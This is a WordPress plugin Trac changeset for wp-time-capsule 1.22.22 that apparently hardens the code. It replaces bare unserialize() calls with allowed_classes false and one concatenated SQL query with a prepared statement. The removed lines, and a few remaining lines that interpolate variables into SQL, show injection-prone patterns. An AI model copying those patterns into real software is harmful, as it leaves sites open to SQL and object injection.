=== Content from plugins.trac.wordpress.org_158aead9_20250115_193658.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%3Fnew%3D3153289%2540wp-time-capsule%26old%3D3153289%2540wp-time-capsule)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Change](/changeset/3117515/wp-time-capsule "Changeset 3117515 for wp-time-capsule")
* [Next Change](/changeset/3153296/wp-time-capsule "Changeset 3153296 for wp-time-capsule") →

---

# Changeset [3153289](/changeset/3153289 "Show full changeset") for [wp-time-capsule](/browser/wp-time-capsule?rev=3153289 "Show entry in browser")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
09/17/2024 12:04:07 PM
([4 months](/timeline?from=2024-09-17T12%3A04%3A07Z&precision=second "See timeline at 09/17/2024 12:04:07 PM") ago)

Author:
WPTimeCapsule
Message:

release 1.22.22

Location:
[wp-time-capsule/trunk](/browser/wp-time-capsule/trunk?rev=3153289)
Files:

26 edited

* [Classes/ActivityLog.php](/browser/wp-time-capsule/trunk/Classes/ActivityLog.php?rev=3153289 "Show entry in browser")
  (modified)
  ([4 diffs](#file0 "Show differences"))
* [Classes/AppFunctions/AppFunctions.php](/browser/wp-time-capsule/trunk/Classes/AppFunctions/AppFunctions.php?rev=3153289 "Show entry in browser")
  (modified)
  ([2 diffs](#file1 "Show differences"))
* [Classes/BackupController.php](/browser/wp-time-capsule/trunk/Classes/BackupController.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file2 "Show differences"))
* [Classes/Config.php](/browser/wp-time-capsule/trunk/Classes/Config.php?rev=3153289 "Show entry in browser")
  (modified)
  ([3 diffs](#file3 "Show differences"))
* [Classes/ExcludeOption/ExcludeOption.php](/browser/wp-time-capsule/trunk/Classes/ExcludeOption/ExcludeOption.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file4 "Show differences"))
* [Classes/GdriveFacade.php](/browser/wp-time-capsule/trunk/Classes/GdriveFacade.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file5 "Show differences"))
* [Classes/Processed/iterator.php](/browser/wp-time-capsule/trunk/Classes/Processed/iterator.php?rev=3153289 "Show entry in browser")
  (modified)
  ([2 diffs](#file6 "Show differences"))
* [Classes/Settings/Settings.php](/browser/wp-time-capsule/trunk/Classes/Settings/Settings.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file7 "Show differences"))
* [Classes/class-file-iterator.php](/browser/wp-time-capsule/trunk/Classes/class-file-iterator.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file8 "Show differences"))
* [Pro/BackupBeforeUpdate/AutoUpdateSettings.php](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289 "Show entry in browser")
  (modified)
  ([10 diffs](#file9 "Show differences"))
* [Pro/BackupBeforeUpdate/init.php](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php?rev=3153289 "Show entry in browser")
  (modified)
  ([3 diffs](#file10 "Show differences"))
* [Pro/Rollback/init.php](/browser/wp-time-capsule/trunk/Pro/Rollback/init.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file11 "Show differences"))
* [Pro/Staging/bridge/bridge.php](/browser/wp-time-capsule/trunk/Pro/Staging/bridge/bridge.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file12 "Show differences"))
* [Pro/Staging/class-update-in-staging.php](/browser/wp-time-capsule/trunk/Pro/Staging/class-update-in-staging.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file13 "Show differences"))
* [Pro/Staging/init.php](/browser/wp-time-capsule/trunk/Pro/Staging/init.php?rev=3153289 "Show entry in browser")
  (modified)
  ([3 diffs](#file14 "Show differences"))
* [Pro/Staging/stage-to-live/includes/class-stage-to-live.php](/browser/wp-time-capsule/trunk/Pro/Staging/stage-to-live/includes/class-stage-to-live.php?rev=3153289 "Show entry in browser")
  (modified)
  ([6 diffs](#file15 "Show differences"))
* [Pro/Vulns/init.php](/browser/wp-time-capsule/trunk/Pro/Vulns/init.php?rev=3153289 "Show entry in browser")
  (modified)
  ([4 diffs](#file16 "Show differences"))
* [Views/wptc-plans.php](/browser/wp-time-capsule/trunk/Views/wptc-plans.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file17 "Show differences"))
* [readme.txt](/browser/wp-time-capsule/trunk/readme.txt?rev=3153289 "Show entry in browser")
  (modified)
  ([3 diffs](#file18 "Show differences"))
* [wp-tcapsule-bridge/pclzip.class.php](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/pclzip.class.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file19 "Show differences"))
* [wp-tcapsule-bridge/upload/php/UploadHandler.php](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file20 "Show differences"))
* [wp-tcapsule-bridge/wp-modified-functions.php](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/wp-modified-functions.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file21 "Show differences"))
* [wp-tcapsule-bridge/wptc-ajax.php](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/wptc-ajax.php?rev=3153289 "Show entry in browser")
  (modified)
  ([2 diffs](#file22 "Show differences"))
* [wp-time-capsule.php](/browser/wp-time-capsule/trunk/wp-time-capsule.php?rev=3153289 "Show entry in browser")
  (modified)
  ([4 diffs](#file23 "Show differences"))
* [wptc-constants.php](/browser/wp-time-capsule/trunk/wptc-constants.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file24 "Show differences"))
* [wptc-cron-functions.php](/browser/wp-time-capsule/trunk/wptc-cron-functions.php?rev=3153289 "Show entry in browser")
  (modified)
  ([1 diff](#file25 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [wp-time-capsule/trunk/Classes/ActivityLog.php](/changeset/3153289/wp-time-capsule/trunk/Classes/ActivityLog.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Classes/ActivityLog.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Classes/ActivityLog.php?rev=2947098#L133 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Classes/ActivityLog.php?rev=3153289#L133 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 133 | 133 |  |
  | 134 | 134 | if ($this->type === 'others') { |
  | 135 |  | return  "SELECT \* FROM " . $this->wpdb->base\_prefix . "wptc\_activity\_log WHERE type = '" . $this->type . "' AND show\_user = 1 "; |
  | 136 |  | } |
  | 137 |  |  |
  | 138 |  | return  "SELECT \* FROM " . $this->wpdb->base\_prefix . "wptc\_activity\_log WHERE type = '" . $this->type . "' AND show\_user = 1 GROUP BY action\_id"; |
  |  | 135 | return  "SELECT \* FROM " . $this->wpdb->base\_prefix . "wptc\_activity\_log WHERE type='others' AND show\_user = 1 "; |
  |  | 136 | } |
  |  | 137 |  |
  |  | 138 |  |
  |  | 139 | return  $this->wpdb->prepare("SELECT \* FROM `". $this->wpdb->base\_prefix . "wptc\_activity\_log` WHERE type=%s AND show\_user = 1 GROUP BY action\_id", $this->type); |
  | 139 | 140 | } |
  | 140 | 141 |  |
  | […](/browser/wp-time-capsule/trunk/Classes/ActivityLog.php?rev=2947098#L208) | […](/browser/wp-time-capsule/trunk/Classes/ActivityLog.php?rev=3153289#L209) |  |
  | 208 | 209 | echo '<tr class="act-tr">'; |
  | 209 | 210 |  |
  | 210 |  | $Ldata = unserialize($rec->log\_data); |
  |  | 211 | $Ldata = unserialize($rec->log\_data, ['allowed\_classes' => false]); |
  | 211 | 212 | $user\_time = WPTC\_Factory::get('config')->cnvt\_UTC\_to\_usrTime($Ldata['log\_time']); |
  | 212 | 213 | WPTC\_Factory::get('processed-files')->modify\_schedule\_backup\_time($user\_time); |
  | […](/browser/wp-time-capsule/trunk/Classes/ActivityLog.php?rev=2947098#L342) | […](/browser/wp-time-capsule/trunk/Classes/ActivityLog.php?rev=3153289#L343) |  |
  | 342 | 343 | $timezone = WPTC\_Factory::get('config')->get\_option('wptc\_timezone'); |
  | 343 | 344 | foreach ($sub\_records as $srec) { |
  | 344 |  | $Moredata = unserialize($srec->log\_data); |
  |  | 345 | $Moredata = unserialize($srec->log\_data, ['allowed\_classes' => false]); |
  | 345 | 346 | $user\_tmz = new DateTime('@' . $Moredata['log\_time'], new DateTimeZone(date\_default\_timezone\_get())); |
  | 346 | 347 | $user\_tmz->setTimeZone( new DateTimeZone($timezone ) ); |
  | […](/browser/wp-time-capsule/trunk/Classes/ActivityLog.php?rev=2947098#L366) | […](/browser/wp-time-capsule/trunk/Classes/ActivityLog.php?rev=3153289#L367) |  |
  | 366 | 367 | } |
  | 367 | 368 |  |
  | 368 |  | $action\_id     = ~~$data['action\_id']~~; |
  |  | 369 | $action\_id     = intval($data['action\_id']); |
  | 369 | 370 | $from\_limit    = $data['limit']; |
  | 370 | 371 | $detailed      = ''; |
* ## [wp-time-capsule/trunk/Classes/AppFunctions/AppFunctions.php](/changeset/3153289/wp-time-capsule/trunk/Classes/AppFunctions/AppFunctions.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Classes/AppFunctions/AppFunctions.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Classes/AppFunctions/AppFunctions.php?rev=2947098#L889 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Classes/AppFunctions/AppFunctions.php?rev=3153289#L889 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 889 | 889 | $privileges\_args = array(); |
  | 890 | 890 | $privileged\_feature = array(); |
  |  | 891 | $privileged\_feature['pro'] = array(); |
  | 891 | 892 |  |
  | 892 | 893 | foreach ($site\_info->subscription\_features as $subscription) { |
  | […](/browser/wp-time-capsule/trunk/Classes/AppFunctions/AppFunctions.php?rev=2947098#L899) | […](/browser/wp-time-capsule/trunk/Classes/AppFunctions/AppFunctions.php?rev=3153289#L900) |  |
  | 899 | 900 | } |
  | 900 | 901 |  |
  | 901 |  | //Remove on production |
  |  | 902 | // Remove on production |
  | 902 | 903 | array\_push($privileges\_args, 'Wptc\_Rollback'); |
  | 903 | 904 | array\_push($privileged\_feature['pro'], 'Wptc\_Rollback'); |
* ## [wp-time-capsule/trunk/Classes/BackupController.php](/changeset/3153289/wp-time-capsule/trunk/Classes/BackupController.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Classes/BackupController.php")

  | [r2974255](/browser/wp-time-capsule/trunk/Classes/BackupController.php?rev=2974255#L321 "Show revision 2974255 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Classes/BackupController.php?rev=3153289#L321 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 321 | 321 | $this->config->set\_option('wptc\_profiling\_start', time()); |
  | 322 | 322 | wptc\_manual\_debug('', 'backup\_execute'); |
  | 323 |  | $contents = @unserialize($this->config->get\_option('this\_cookie')); |
  |  | 323 | $contents = @unserialize($this->config->get\_option('this\_cookie'), ['allowed\_classes' => false]); |
  | 324 | 324 | $backup\_id = $contents['backupID']; |
  | 325 | 325 |  |
* ## [wp-time-capsule/trunk/Classes/Config.php](/changeset/3153289/wp-time-capsule/trunk/Classes/Config.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Classes/Config.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Classes/Config.php?rev=2947098#L871 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Classes/Config.php?rev=3153289#L871 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 871 | 871 | $privileged\_feature = array(); |
  | 872 | 872 | $privileges\_args = array(); |
  |  | 873 | $privileged\_feature['pro'] = array(); |
  | 873 | 874 |  |
  | 874 | 875 | foreach($sub\_features as $plan\_id => $single\_sub){ |
  | […](/browser/wp-time-capsule/trunk/Classes/Config.php?rev=2947098#L879) | […](/browser/wp-time-capsule/trunk/Classes/Config.php?rev=3153289#L880) |  |
  | 879 | 880 | } |
  | 880 | 881 |  |
  | 881 |  | //Remove on production |
  |  | 882 | // Remove on production |
  | 882 | 883 | array\_push($privileges\_args, 'Wptc\_Rollback'); |
  | 883 | 884 | array\_push($privileged\_feature['pro'], 'Wptc\_Rollback'); |
  | […](/browser/wp-time-capsule/trunk/Classes/Config.php?rev=2947098#L1321) | […](/browser/wp-time-capsule/trunk/Classes/Config.php?rev=3153289#L1322) |  |
  | 1321 | 1322 | public function get\_database\_encryption\_settings($type){ |
  | 1322 | 1323 | $settings = $this->get\_option('database\_encrypt\_settings'); |
  | 1323 |  | $settings = !empty($settings) ? unserialize($settings) : array(); |
  |  | 1324 | $settings = !empty($settings) ? unserialize($settings, ['allowed\_classes' => false]) : array(); |
  | 1324 | 1325 |  |
  | 1325 | 1326 | if (empty($settings)) { |
* ## [wp-time-capsule/trunk/Classes/ExcludeOption/ExcludeOption.php](/changeset/3153289/wp-time-capsule/trunk/Classes/ExcludeOption/ExcludeOption.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Classes/ExcludeOption/ExcludeOption.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Classes/ExcludeOption/ExcludeOption.php?rev=2947098#L1293 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Classes/ExcludeOption/ExcludeOption.php?rev=3153289#L1293 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 1293 | 1293 | } |
  | 1294 | 1294 |  |
  | 1295 |  | $settings       = unserialize($raw\_settings); |
  |  | 1295 | $settings       = unserialize($raw\_settings, ['allowed\_classes' => false]); |
  | 1296 | 1296 |  |
  | 1297 | 1297 | if($settings['size'] < (10 \* 1024 \* 1024)){ |
* ## [wp-time-capsule/trunk/Classes/GdriveFacade.php](/changeset/3153289/wp-time-capsule/trunk/Classes/GdriveFacade.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Classes/GdriveFacade.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Classes/GdriveFacade.php?rev=2947098#L121 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Classes/GdriveFacade.php?rev=3153289#L121 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 121 | 121 | $token\_obj = $this->config->get\_option('gdrive\_old\_token'); |
  | 122 | 122 | if (!empty($token\_obj)) { |
  | 123 |  | $token\_arr = unserialize($token\_obj); |
  |  | 123 | $token\_arr = unserialize($token\_obj, ['allowed\_classes' => false]); |
  | 124 | 124 | return $token\_arr['refresh\_token']; |
  | 125 | 125 | } else { |
* ## [wp-time-capsule/trunk/Classes/Processed/iterator.php](/changeset/3153289/wp-time-capsule/trunk/Classes/Processed/iterator.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Classes/Processed/iterator.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Classes/Processed/iterator.php?rev=2947098#L53 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Classes/Processed/iterator.php?rev=3153289#L53 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 53 | 53 |  |
  | 54 | 54 | public function get\_table($name) { |
  | 55 |  | $single\_table\_result = $this->db->get\_results("SELECT \* FROM {$this->db->base\_prefix}wptc\_processed\_{$this->getTableName()} WHERE ~~name =~~ '$name'"); |
  |  | 55 | $single\_table\_result = $this->db->get\_results("SELECT \* FROM {$this->db->base\_prefix}wptc\_processed\_{$this->getTableName()} WHERE `name`='$name'"); |
  | 56 | 56 |  |
  | 57 | 57 | if (!empty($single\_table\_result)) { |
  | […](/browser/wp-time-capsule/trunk/Classes/Processed/iterator.php?rev=2947098#L61) | […](/browser/wp-time-capsule/trunk/Classes/Processed/iterator.php?rev=3153289#L61) |  |
  | 61 | 61 |  |
  | 62 | 62 | public function get\_unfnished\_folder() { |
  | 63 |  | $sql = "SELECT \* FROM {$this->db->base\_prefix}wptc\_processed\_{$this->getTableName()} WHERE `offset`~~!= -1~~ LIMIT 1"; |
  |  | 63 | $sql = "SELECT \* FROM {$this->db->base\_prefix}wptc\_processed\_{$this->getTableName()} WHERE `offset`!='-1' LIMIT 1"; |
  | 64 | 64 | $response = $this->db->get\_results($sql); |
  | 65 | 65 |  |
* ## [wp-time-capsule/trunk/Classes/Settings/Settings.php](/changeset/3153289/wp-time-capsule/trunk/Classes/Settings/Settings.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Classes/Settings/Settings.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Classes/Settings/Settings.php?rev=2947098#L11 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Classes/Settings/Settings.php?rev=3153289#L11 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 11 | 11 | public function \_\_construct(){ |
  | 12 | 12 | if(WPTC\_ENV === 'production'){ |
  | 13 |  | $this->server\_ips =  array( '52.33.122.174', '52.27.206.180'); |
  |  | 13 | $this->server\_ips =  array( '52.33.122.174', '52.27.206.180', '52.25.129.179', '35.166.193.49'); |
  | 14 | 14 | } else { |
  | 15 | 15 | $this->server\_ips =  array( '52.32.120.186'); |
* ## [wp-time-capsule/trunk/Classes/class-file-iterator.php](/changeset/3153289/wp-time-capsule/trunk/Classes/class-file-iterator.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Classes/class-file-iterator.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Classes/class-file-iterator.php?rev=2947098#L207 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Classes/class-file-iterator.php?rev=3153289#L207 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 207 | 207 |  |
  | 208 | 208 | private function insert\_into\_iterator\_process($qry){ |
  | 209 |  | $sql = "~~insert into " . $this->wpdb->base\_prefix . "wptc\_processed\_iterator ( `name`, `offset`  ) values $qry~~"; |
  |  | 209 | $sql = "INSERT into `" . $this->wpdb->base\_prefix . "wptc\_processed\_iterator` ( `name`, `offset` ) values $qry ;"; |
  | 210 | 210 | $result = $this->wpdb->query($sql); |
  |  | 211 | if($result === false){ |
  |  | 212 | wptc\_log($sql, '--------insert\_into\_iterator\_process--qry--sql----'); |
  |  | 213 | wptc\_log($this->wpdb->last\_error, '--------insert\_into\_iterator\_process--qry--error----'); |
  |  | 214 | } |
  | 211 | 215 | } |
  | 212 | 216 |  |
* ## [wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php](/changeset/3153289/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L19 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L19 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 19 | 19 | } |
  | 20 | 20 |  |
  | 21 |  | $settings = unserialize($settings\_serialized); |
  |  | 21 | $settings = unserialize($settings\_serialized, ['allowed\_classes' => false]); |
  | 22 | 22 | return $settings['update\_settings']; |
  | 23 | 23 | } |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L535) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L535) |  |
  | 535 | 535 | } |
  | 536 | 536 |  |
  | 537 |  | $settings = unserialize($settings\_serialized); |
  |  | 537 | $settings = unserialize($settings\_serialized, ['allowed\_classes' => false]); |
  | 538 | 538 | $settings['update\_settings']['status'] = 'no'; |
  | 539 | 539 | $this->config->set\_option('wptc\_auto\_update\_settings', serialize($settings)); |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L550) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L550) |  |
  | 550 | 550 | } |
  | 551 | 551 |  |
  | 552 |  | $settings = unserialize($settings\_serialized); |
  |  | 552 | $settings = unserialize($settings\_serialized, ['allowed\_classes' => false]); |
  | 553 | 553 | $settings['update\_settings']['themes']['status'] = false; |
  | 554 | 554 | $this->config->set\_option('wptc\_auto\_update\_settings', serialize($settings)); |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L580) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L580) |  |
  | 580 | 580 |  |
  | 581 | 581 | if(!empty($settings['auto\_update']['plugins']['included'])){ |
  | 582 |  | $plugins\_included = $this->get\_slug\_from\_array(unserialize($settings['auto\_update']['plugins']['included'])); |
  |  | 582 | $plugins\_included = $this->get\_slug\_from\_array(unserialize($settings['auto\_update']['plugins']['included'], ['allowed\_classes' => false])); |
  | 583 | 583 | } else { |
  | 584 | 584 | $plugins\_included = array(); |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L588) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L588) |  |
  | 588 | 588 |  |
  | 589 | 589 | if(!empty($settings['auto\_update']['themes']['included'])){ |
  | 590 |  | $themes\_included = unserialize($settings['auto\_update']['themes']['included']); |
  |  | 590 | $themes\_included = unserialize($settings['auto\_update']['themes']['included'], ['allowed\_classes' => false]); |
  | 591 | 591 | } else { |
  | 592 | 592 | $themes\_included = array(); |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L628) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L628) |  |
  | 628 | 628 | } |
  | 629 | 629 |  |
  | 630 |  | $settings = unserialize($settings\_serialized); |
  |  | 630 | $settings = unserialize($settings\_serialized, ['allowed\_classes' => false]); |
  | 631 | 631 |  |
  | 632 | 632 | // wptc\_log($settings,'-----------$settings----------------'); |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L638) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L638) |  |
  | 638 | 638 |  |
  | 639 | 639 | $items = $settings['update\_settings'][$type]['included']; |
  | 640 |  | $items = unserialize($items); |
  |  | 640 | $items = unserialize($items, ['allowed\_classes' => false]); |
  | 641 | 641 |  |
  | 642 | 642 | if (empty($items)) { |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L673) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L673) |  |
  | 673 | 673 | } |
  | 674 | 674 |  |
  | 675 |  | $settings = unserialize($settings\_serialized); |
  |  | 675 | $settings = unserialize($settings\_serialized, ['allowed\_classes' => false]); |
  | 676 | 676 |  |
  | 677 | 677 | // wptc\_log($settings,'-----------$settings----------------'); |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L757) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L757) |  |
  | 757 | 757 | } |
  | 758 | 758 |  |
  | 759 |  | $existing\_plugins\_list = !empty($settings['update\_settings']['plugins']['included']) ? unserialize($settings['update\_settings']['plugins']['included']) : array(); |
  |  | 759 | $existing\_plugins\_list = !empty($settings['update\_settings']['plugins']['included']) ? unserialize($settings['update\_settings']['plugins']['included'], ['allowed\_classes' => false]) : array(); |
  | 760 | 760 |  |
  | 761 | 761 | wptc\_log($existing\_plugins\_list,'-----------$existing\_plugins\_list----------------'); |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=2947098#L803) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/AutoUpdateSettings.php?rev=3153289#L803) |  |
  | 803 | 803 | } |
  | 804 | 804 |  |
  | 805 |  | $existing\_themes\_list = !empty($settings['update\_settings']['themes']['included']) ? unserialize($settings['update\_settings']['themes']['included']) : array(); |
  |  | 805 | $existing\_themes\_list = !empty($settings['update\_settings']['themes']['included']) ? unserialize($settings['update\_settings']['themes']['included'], ['allowed\_classes' => false]) : array(); |
  | 806 | 806 |  |
  | 807 | 807 | if (!in\_array($theme, $existing\_themes\_list)) { |
* ## [wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php](/changeset/3153289/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php?rev=2947098#L341 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php?rev=3153289#L341 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 341 | 341 | } |
  | 342 | 342 |  |
  | 343 |  | $upgrade\_responses = unserialize($raw\_data); |
  |  | 343 | $upgrade\_responses = unserialize($raw\_data, ['allowed\_classes' => false]); |
  | 344 | 344 |  |
  | 345 | 345 | wptc\_log($upgrade\_responses, '--------$upgrade\_responses update\_response\_details--------'); |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php?rev=2947098#L984) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php?rev=3153289#L984) |  |
  | 984 | 984 | $update\_response\_details['update\_type'] = $this->process\_upgrade\_type\_prefix; |
  | 985 | 985 | } else { |
  | 986 |  | $update\_response\_details = unserialize($raw\_update\_response\_details); |
  |  | 986 | $update\_response\_details = unserialize($raw\_update\_response\_details, ['allowed\_classes' => false]); |
  | 987 | 987 | } |
  | 988 | 988 |  |
  | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php?rev=2947098#L1572) | […](/browser/wp-time-capsule/trunk/Pro/BackupBeforeUpdate/init.php?rev=3153289#L1572) |  |
  | 1572 | 1572 | } |
  | 1573 | 1573 |  |
  | 1574 |  | $bulk\_update\_request = unserialize($raw\_bulk\_update\_request); |
  |  | 1574 | $bulk\_update\_request = unserialize($raw\_bulk\_update\_request, ['allowed\_classes' => false]); |
  | 1575 | 1575 |  |
  | 1576 | 1576 | wptc\_log($bulk\_update\_request, '--------$bulk\_update\_request--------'); |
* ## [wp-time-capsule/trunk/Pro/Rollback/init.php](/changeset/3153289/wp-time-capsule/trunk/Pro/Rollback/init.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Pro/Rollback/init.php")

  | [r2947098](/browser/wp-time-capsule/trunk/Pro/Rollback/init.php?rev=2947098#L77 "Show revision 2947098 of this file in browser") | [r3153289](/browser/wp-time-capsule/trunk/Pro/Rollback/init.php?rev=3153289#L77 "Show revision 3153289 of this file in browser") |  |
  | --- | --- | --- |
  | 77 | 77 |  |
  | 78 | 78 | private function tokenize\_upgrade\_details($result){ |
  | 79 |  | $update\_details = unserialize($result->update\_details); |
  |  | 79 | $update\_details = unserialize($result->update\_details, ['allowed\_classes' => false]); |
  | 80 | 80 |  |
  | 81 | 81 | if ($this->request['type'] === 'plugin') { |
* ## [wp-time-capsule/trunk/Pro/Staging/bridge/bridge.php](/changeset/3153289/wp-time-capsule/trunk/Pro/Staging/bridge/bridge.php "Show the changeset 3153289 restricted to wp-time-capsule/trunk/Pro/Staging/bridge/bridge.php")

